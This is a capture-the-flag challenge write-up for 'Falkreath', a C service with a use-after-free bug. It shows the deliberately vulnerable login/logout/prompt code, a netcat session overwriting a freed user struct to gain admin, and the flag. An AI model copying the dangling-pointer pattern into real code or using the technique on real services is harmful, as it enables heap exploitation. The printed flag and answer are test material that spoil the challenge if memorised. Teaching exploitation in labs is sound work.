# Falkreath

## Question Text

What is this useless service?

*Creator - PotatoDrug*

## Setup Guide
Run `./build.sh`

## Distribution
- Falkreath.c
    - SHA1: `917903dfd0e9a01ad658bacb5ba1e5b6b6e700d3`
    - Source code

## Solution
The service is vulnerable to Use After Free exploit.

As you can see from the code below, after allocating memory to userptr with `login` we can free the memory using `logout` which allows us to use `prompt` to allocate data where `32 < len(data) < 39` to the freed memory so that `isadmin` is not zero. This works because `userptr` is still pointing to the address even though the memory is freed and `strdup` uses malloc.
```c
if(strncmp(line, "login ", 6) == 0) {
  userptr = calloc(1, sizeof(struct user)); // allocates 36 bytes (32+4) from the heap
  if(strlen(line + 6) < 31) {
      strcpy(userptr->name, line + 6);
  }
} else if(strcmp(line, "logout\n") == 0) {
  free(userptr);
} else if(strncmp(line, "prompt ", 7) == 0) {
  prompt = strdup(line + 7);
  prompt[strcspn(prompt, "\r\n")] = 0;
} else if(strcmp(line, "getflag\n") == 0) {
  if (userptr != NULL) {
    if(userptr->isadmin) {
      printf("Flag: %s\n", getenv("FLAG"));
      return 0;
    } else {
      printf("Not admin!\n");
    }
  } else {
    printf("Please login first!\n");
  }
}
```

```
➜ nc 127.0.0.1 18000
___________        .__    __                              __   .__                                        
\_   _____/_____   |  |  |  | _________   ____  _____   _/  |_ |  |__                                     
 |    __)  \__  \  |  |  |  |/ /\_  __ \_/ __ \ \__  \  \   __\|  |  \                                    
 |     \    / __ \_|  |__|    <  |  | \/\  ___/  / __ \_ |  |  |   Y  \                                   
 \___  /   (____  /|____/|__|_ \ |__|    \___  >(____  / |__|  |___|  /                                   
     \/         \/            \/             \/      \/             \/                                    
Not logged in
>login bob
User: bob

>logout
User:
>prompt AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgetflag
Flag: GCTF{WH47_4_he4pPie_EXPL0I7}
```

[Sample Solution](solution/solve.py)

### Flag
`GCTF{WH47_4_he4pPie_EXPL0I7}`